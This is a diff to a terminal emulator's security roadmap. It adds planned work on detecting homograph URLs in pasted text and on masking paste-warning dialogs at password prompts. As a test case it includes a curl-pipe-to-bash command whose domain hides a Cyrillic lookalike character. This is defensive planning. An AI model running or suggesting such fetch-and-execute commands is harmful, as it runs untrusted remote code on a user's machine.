@@ -19,6 +19,12 @@ sections:
   - id: "45.4"
     title: Drag-Drop & Hyperlink Safety
     status: partially-started
+  - id: "45.6"
+    title: "Homograph Attack Detection in Paste"
+    status: not-started
+  - id: "45.7"
+    title: "Password-Aware Paste Warning"
+    status: not-started
   - id: "45.5"
     title: Section Completion
     status: not-started
@@ -330,6 +336,44 @@ Protect against command injection via file paths and dangerous URIs.
   - [ ] `https` scheme allowed
   - [ ] Bare mouse click does NOT open URL (modifier required)
   - [ ] Ctrl+Click opens URL when `link_click_modifier = "Control"`
+
+---
+
+## 45.6 Homograph Attack Detection in Paste
+
+<!-- Ghostty audit: #10762 (safe paste detection for homograph attacks) -->
+
+**Source:** Ghostty #10762 — URLs can contain Cyrillic/Greek lookalike characters that visually impersonate Latin characters (e.g., Cyrillic `і` looks identical to Latin `i`). When a user pastes `curl https://іnstall.example.dev | bash`, the URL points to a completely different domain than it appears. The terminal should detect mixed-script URLs and warn.
+
+**Required work:**
+
+- [ ] Implement homograph detection: scan pasted text for URLs containing a mix of Latin and non-Latin characters in the same domain label
+- [ ] Use Unicode script detection: if a domain label contains characters from 2+ scripts (excluding Common/Inherited), flag as suspicious
+- [ ] Show warning dialog: "This paste contains a URL with mixed-script characters that may be a homograph attack: {url}" with Accept/Reject buttons
+- [ ] Reference implementation: [tirith-core homoglyph.rs](https://github.com/sheeki03/tirith/blob/main/crates/tirith-core/src/homoglyph.rs)
+- [ ] Integrate with existing paste warning infrastructure (Section 45.2)
+- [ ] Test: paste `curl https://іnstall.example.dev | bash` → warning triggered; paste `curl https://install.example.dev | bash` → no warning
+
+**Priority:** Medium — security feature, increasingly relevant as terminal-based supply chain attacks grow.
+
+---
+
+## 45.7 Password-Aware Paste Warning
+
+<!-- Ghostty audit: #11949 (paste warning should hide contents at password field) -->
+
+**Source:** Ghostty #11949 — When pasting into a password prompt (detected via `detect_password_input`), the "Potentially Unsafe Paste" dialog shows the password in plaintext. In public/shared screen situations, this reveals the password.
+
+**Problem:** ori_term has paste warning dialogs but doesn't consider whether the terminal is in a password input state. The warning dialog always shows the full paste content.
+
+**Required work:**
+
+- [ ] Detect password input state: check if the terminal has echo disabled (password mode detection via `ECHO` flag in PTY settings, or via OSC 133 semantic prompt annotations)
+- [ ] When in password state AND paste warning triggers: mask the paste content in the dialog (show `••••••••` instead of the actual text)
+- [ ] Alternative: skip the unsafe paste warning entirely for single-line pastes into password fields (the warning is less useful since passwords are expected to be pasted)
+- [ ] Test: enter password prompt (`read -s`), paste text with newline → verify dialog shows masked content
+
+**Priority:** Medium — security/privacy feature.
 
 ---
 
